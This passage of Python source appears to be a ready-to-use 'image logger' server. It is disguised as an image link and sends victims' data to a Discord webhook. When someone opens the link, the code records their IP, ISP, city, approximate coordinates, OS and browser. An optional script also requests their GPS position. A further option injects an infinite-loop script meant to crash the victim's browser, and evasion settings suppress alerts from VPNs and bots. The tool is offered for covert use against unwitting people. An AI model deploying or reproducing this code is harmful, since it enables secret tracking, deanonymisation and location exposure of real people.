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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
